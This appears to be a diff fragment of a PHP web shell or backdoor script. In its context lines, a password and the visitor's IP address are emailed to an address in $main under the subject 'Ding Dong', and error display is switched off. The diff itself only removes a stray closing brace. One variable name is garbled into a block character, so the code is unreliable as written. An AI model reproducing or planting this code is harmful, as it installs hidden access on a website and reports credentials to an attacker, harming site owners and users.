@@ -28,10 +28,8 @@ ini_set('max_execution_time', 5000);
 	$notif = "$now *PW : [ " . $▛ . " ]";
 	mail($main, "Ding Dong ", $notif, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
-<?php
-}
-?>
->
+
+
   <?php
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
